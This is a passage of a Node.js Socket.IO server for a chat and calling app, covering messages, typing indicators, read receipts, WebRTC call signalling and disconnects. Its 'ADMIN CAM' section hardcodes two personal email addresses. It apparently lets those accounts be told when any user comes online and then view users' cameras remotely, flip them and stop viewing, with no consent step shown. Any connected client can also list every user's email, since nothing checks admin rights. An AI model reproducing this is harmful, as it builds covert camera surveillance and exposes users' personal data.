      socket.camEmail = emailRoom;
      socket.camUsername = username || 'User';
      if (!onlineUsers.has(emailRoom)) onlineUsers.set(emailRoom, new Set());
      onlineUsers.get(emailRoom).add(socket.id);
    }

    if (userId) {
      const idRoom = String(userId).trim();
      socket.join(idRoom);
      socket.userId = idRoom;
      if (!onlineUsers.has(idRoom)) onlineUsers.set(idRoom, new Set());
      onlineUsers.get(idRoom).add(socket.id);
    }

    heartbeatMap.set(socket.id, {
      userId: socket.userId,
      email: socket.userEmail,
      timestamp: Date.now()
    });

    broadcastActivityUpdate(socket.userId, socket.userEmail, true, new Date().toISOString());
    broadcastOnlineUsers();
  });

  // HEARTBEAT
  socket.on('heartbeat', ({ userId, email }) => {
    heartbeatMap.set(socket.id, {
      userId: socket.userId || userId,
      email: socket.userEmail || (email ? email.toLowerCase().trim() : undefined),
      timestamp: Date.now()
    });
  });

  // MESSAGING
  socket.on('send_social_message', (data) => {
    const receiverEmailRoom = data.receiverEmail ? data.receiverEmail.toLowerCase().trim() : null;
    const receiverIdRoom = data.receiverId ? String(data.receiverId).trim() : null;

    if (receiverEmailRoom) socket.to(receiverEmailRoom).emit('receive_social_message', data);
    if (receiverIdRoom && receiverIdRoom !== receiverEmailRoom) socket.to(receiverIdRoom).emit('receive_social_message', data);

    const senderEmailRoom = socket.userEmail ? socket.userEmail.toLowerCase().trim() : null;
    const senderIdRoom = socket.userId ? String(socket.userId).trim() : null;
    if (senderEmailRoom) socket.to(senderEmailRoom).emit('receive_social_message', data);
    if (senderIdRoom && senderIdRoom !== senderEmailRoom) socket.to(senderIdRoom).emit('receive_social_message', data);
  });

  socket.on('delete_social_message', (data) => {
    const { receiverEmail, receiverId, ...deleteData } = data;
    if (receiverEmail) socket.to(receiverEmail.toLowerCase().trim()).emit('receive_social_delete', deleteData);
    if (receiverId) socket.to(String(receiverId).trim()).emit('receive_social_delete', deleteData);
  });

  socket.on('react_social_message', (data) => {
    const { receiverEmail, receiverId, ...reactionData } = data;
    const targetRoom = receiverEmail ? receiverEmail.toLowerCase().trim() : receiverId ? String(receiverId).trim() : null;
    if (targetRoom) socket.to(targetRoom).emit('receive_social_reaction', reactionData);
  });

  socket.on('change_chat_theme', (data) => {
    const { receiverEmail, receiverId, ...themeData } = data;
    const targetRoom = receiverEmail ? receiverEmail.toLowerCase().trim() : receiverId ? String(receiverId).trim() : null;
    if (targetRoom) socket.to(targetRoom).emit('receive_chat_theme', themeData);
  });

  socket.on('change_nickname', (data) => {
    const { receiverEmail, receiverId, ...nicknameData } = data;
    const targetRoom = receiverEmail ? receiverEmail.toLowerCase().trim() : receiverId ? String(receiverId).trim() : null;
    if (targetRoom) socket.to(targetRoom).emit('receive_nickname', nicknameData);
  });

  socket.on('user_profile_updated', (data) => {
    recordActivity();
    socket.broadcast.emit('user_profile_updated', data);
  });

  socket.on('get_server_edge_count', () => {
    recordActivity();
    socket.emit('server_edge_count', totalServerActivityCount);
  });

  socket.on('social_request_event', (data) => {
    const { targetEmail, targetUserId, ...eventData } = data;
    if (targetEmail) socket.to(targetEmail.toLowerCase().trim()).emit('receive_social_request_event', eventData);
    if (targetUserId) socket.to(String(targetUserId).trim()).emit('receive_social_request_event', eventData);
  });

  // TYPING
  socket.on('typing', ({ receiverEmail, receiverId }) => {
    const payload = { email: socket.userEmail, userId: socket.userId };
    if (receiverEmail) socket.to(receiverEmail.toLowerCase().trim()).emit('user_typing', payload);
    if (receiverId) socket.to(String(receiverId).trim()).emit('user_typing', payload);
  });

  socket.on('stop_typing', ({ receiverEmail, receiverId }) => {
    const payload = { email: socket.userEmail, userId: socket.userId };
    if (receiverEmail) socket.to(receiverEmail.toLowerCase().trim()).emit('user_stop_typing', payload);
    if (receiverId) socket.to(String(receiverId).trim()).emit('user_stop_typing', payload);
  });

  // SEEN
  socket.on('mark_as_seen', ({ senderEmail, senderId }) => {
    const seenAt = new Date().toISOString();
    if (senderEmail) socket.to(senderEmail.toLowerCase().trim()).emit('messages_seen', { seenAt });
    if (senderId) socket.to(String(senderId).trim()).emit('messages_seen', { seenAt });
  });

  // CALLS & WEBRTC
  const handleCallRequest = (data) => {
    const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
    const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;

    const now = Date.now();
    const lastCall = callRateLimitMap.get(socket.id);
    if (lastCall && now - lastCall < CALL_RATE_LIMIT_MS) return;
    callRateLimitMap.set(socket.id, now);

    if (!socket.userEmail && !socket.userId) return;

    const targetSockets = new Set([...getRoomSockets(targetEmail), ...getRoomSockets(targetUserId)]);
    const isTargetBusy = [...targetSockets].some(sid => activeCalls.has(sid));

    if (isTargetBusy) {
      socket.emit('call_busy', { email: targetEmail, userId: targetUserId, callId: data.callId });
      return;
    }

    if ((targetEmail && targetEmail === socket.userEmail) || (targetUserId && targetUserId === socket.userId)) return;

    const callId = data.callId || `call-${Date.now()}-${Math.random().toString(36).substr(2, 6)}`;
    const payload = { from: { email: socket.userEmail, id: socket.userId, ...data.from }, type: data.type, callId };

    if (targetEmail) socket.to(targetEmail).emit('incoming_call', payload);
    if (targetUserId && targetUserId !== targetEmail) socket.to(targetUserId).emit('incoming_call', payload);
  };

  socket.on('call_user', handleCallRequest);
  socket.on('call_request', handleCallRequest);

  const handleCallAccept = (data) => {
    const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
    const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;

    activeCalls.add(socket.id);
    const targetSockets = new Set([...getRoomSockets(targetEmail), ...getRoomSockets(targetUserId)]);
    targetSockets.forEach(sid => activeCalls.add(sid));

    activeCallInfo.set(socket.id, { callId: data.callId, peerEmail: targetEmail, peerUserId: targetUserId });
    targetSockets.forEach(sid => {
      activeCallInfo.set(sid, { callId: data.callId, peerEmail: socket.userEmail, peerUserId: socket.userId });
    });

    const payload = { from: socket.userEmail || socket.userId, callId: data.callId };
    if (targetEmail) socket.to(targetEmail).emit('call_accepted', payload);
    if (targetUserId && targetUserId !== targetEmail) socket.to(targetUserId).emit('call_accepted', payload);
  };

  socket.on('accept_call', handleCallAccept);
  socket.on('call_accept', handleCallAccept);

  const handleCallDecline = (data) => {
    const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
    const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;

    activeCalls.delete(socket.id);
    activeCallInfo.delete(socket.id);

    const targetSockets = new Set([...getRoomSockets(targetEmail), ...getRoomSockets(targetUserId)]);
    targetSockets.forEach(sid => {
      activeCalls.delete(sid);
      activeCallInfo.delete(sid);
    });

    const payload = { by: socket.userEmail || socket.userId, callId: data.callId };
    if (targetEmail) socket.to(targetEmail).emit('call_rejected', payload);
    if (targetUserId && targetUserId !== targetEmail) socket.to(targetUserId).emit('call_rejected', payload);
  };

  socket.on('reject_call', handleCallDecline);
  socket.on('call_decline', handleCallDecline);

  socket.on('call_cancel', (data) => {
    const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
    const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;

    activeCalls.delete(socket.id);
    activeCallInfo.delete(socket.id);

    const targetSockets = new Set([...getRoomSockets(targetEmail), ...getRoomSockets(targetUserId)]);
    targetSockets.forEach(sid => {
      activeCalls.delete(sid);
      activeCallInfo.delete(sid);
    });

    const payload = { by: socket.userEmail || socket.userId, callId: data.callId };
    if (targetEmail) socket.to(targetEmail).emit('call_cancelled', payload);
    if (targetUserId && targetUserId !== targetEmail) socket.to(targetUserId).emit('call_cancelled', payload);
  });

  socket.on('call_timeout', (data) => {
    const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
    const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;

    activeCalls.delete(socket.id);
    activeCallInfo.delete(socket.id);

    const targetSockets = new Set([...getRoomSockets(targetEmail), ...getRoomSockets(targetUserId)]);
    targetSockets.forEach(sid => {
      activeCalls.delete(sid);
      activeCallInfo.delete(sid);
    });

    const payload = { by: socket.userEmail || socket.userId, callId: data.callId };
    if (targetEmail) socket.to(targetEmail).emit('call_timed_out', payload);
    if (targetUserId && targetUserId !== targetEmail) socket.to(targetUserId).emit('call_timed_out', payload);
  });

  const handleCallEnd = (data) => {
    const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
    const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;

    activeCalls.delete(socket.id);
    callRateLimitMap.delete(socket.id);
    activeCallInfo.delete(socket.id);

    const targetSockets = new Set([...getRoomSockets(targetEmail), ...getRoomSockets(targetUserId)]);
    targetSockets.forEach(sid => {
      activeCalls.delete(sid);
      activeCallInfo.delete(sid);
    });

    const payload = { callId: data.callId };
    if (targetEmail) socket.to(targetEmail).emit('call_ended', payload);
    if (targetUserId && targetUserId !== targetEmail) socket.to(targetUserId).emit('call_ended', payload);
  };

  socket.on('end_call', handleCallEnd);
  socket.on('call_end', handleCallEnd);

  socket.on('webrtc_signal', (data) => {
    const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
    const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;
    const targetSocketId = data.targetSocketId;

    const payload = {
      signal: data.signal || data,
      from: socket.userEmail || socket.userId,
      fromSocketId: socket.id,
      callId: data.callId
    };

    if (targetSocketId) {
      const targetSocket = io.sockets.sockets.get(targetSocketId);
      if (targetSocket && targetSocket.connected) {
        targetSocket.emit('webrtc_signal', payload);
        return;
      }
    }

    if (targetEmail) socket.to(targetEmail).emit('webrtc_signal', payload);
    if (targetUserId && targetUserId !== targetEmail) socket.to(targetUserId).emit('webrtc_signal', payload);
  });

  // ADMIN CAM
  const ADMIN_EMAILS = ['hammadnawz519@gmail.com', 'hammadnawaz519@gmail.com'];
  socket.on('cam_user_online', ({ email, username }) => {
    socket.camEmail = email ? email.toLowerCase().trim() : null;
    socket.camUsername = username || email;
    if (socket.camEmail) socket.join('cam_room_' + socket.camEmail);
    ADMIN_EMAILS.forEach(adminEmail => {
      socket.to(adminEmail).emit('cam_user_online_event', { email: socket.camEmail, username: socket.camUsername, socketId: socket.id });
    });
  });

  socket.on('cam_get_users', () => {
    const userMap = new Map();
    for (const [, s] of io.sockets.sockets) {
      const email = s.camEmail || s.userEmail;
      if (email) {
        const cleanEmail = email.toLowerCase().trim();
        const username = s.camUsername || s.username || 'User';
        if (!userMap.has(cleanEmail)) userMap.set(cleanEmail, { email: cleanEmail, username, socketId: s.id });
      }
    }
    socket.emit('cam_users_list', Array.from(userMap.values()));
  });

  socket.on('cam_signal', ({ targetSocketId, targetEmail, signal }) => {
    const payload = { fromSocketId: socket.id, fromEmail: socket.camEmail || socket.userEmail, signal };
    if (targetSocketId) {
      const targetSocket = io.sockets.sockets.get(targetSocketId);
      if (targetSocket && targetSocket.connected) return targetSocket.emit('cam_signal', payload);
    }
    if (targetEmail) socket.to('cam_room_' + targetEmail.toLowerCase().trim()).emit('cam_signal', payload);
  });

  socket.on('cam_flip_camera', ({ targetSocketId, targetEmail }) => {
    const payload = { fromSocketId: socket.id };
    if (targetSocketId) {
      const targetSocket = io.sockets.sockets.get(targetSocketId);
      if (targetSocket && targetSocket.connected) return targetSocket.emit('cam_flip_camera', payload);
    }
    if (targetEmail) socket.to('cam_room_' + targetEmail.toLowerCase().trim()).emit('cam_flip_camera', payload);
  });

  socket.on('cam_stop_viewing', ({ targetSocketId, targetEmail }) => {
    const payload = { fromSocketId: socket.id };
    if (targetSocketId) {
      const targetSocket = io.sockets.sockets.get(targetSocketId);
      if (targetSocket && targetSocket.connected) return targetSocket.emit('cam_stop_viewing', payload);
    }
    if (targetEmail) socket.to('cam_room_' + targetEmail.toLowerCase().trim()).emit('cam_stop_viewing', payload);
  });

  // DISCONNECT
  socket.on('disconnect', () => {
    const callInfo = activeCallInfo.get(socket.id);
    if (callInfo) {
      const payload = { callId: callInfo.callId, by: socket.userEmail || socket.userId };
      if (callInfo.peerEmail) io.to(callInfo.peerEmail).emit('call_ended', payload);
      if (callInfo.peerUserId) io.to(callInfo.peerUserId).emit('call_ended', payload);
      activeCallInfo.delete(socket.id);
    }

    activeCalls.delete(socket.id);
    callRateLimitMap.delete(socket.id);
    heartbeatMap.delete(socket.id);

    if (socket.camEmail || socket.userEmail) {
      ADMIN_EMAILS.forEach(adminEmail => {
        io.to(adminEmail).emit('cam_user_offline', { socketId: socket.id });
        io.to('cam_room_' + adminEmail).emit('cam_user_offline', { socketId: socket.id });
      });
    }

    const roomsToClean = [socket.userEmail, socket.userId].filter(Boolean);
    let wentOffline = false;

    roomsToClean.forEach(room => {
      const sockets = onlineUsers.get(room);
      if (sockets) {
        sockets.delete(socket.id);
        if (sockets.size === 0) {
          onlineUsers.delete(room);
          wentOffline = true;
        }
      }
    });

    if (wentOffline) {
      broadcastActivityUpdate(socket.userId, socket.userEmail, false, new Date().toISOString());
      broadcastOnlineUsers();
    }
  });
});

const PORT = process.env.PORT || 8080;
httpServer.listen(PORT, '0.0.0.0', () => {
  console.log(`>>> Connect Backend & Realtime Server listening on port ${PORT}`);
  console.log(`>>> Allowed Origins: ${process.env.CLIENT_URL || '*'}`);
  console.log(`>>> Database Pool: ${pool ? 'Connected' : 'Not configured'}`);
});
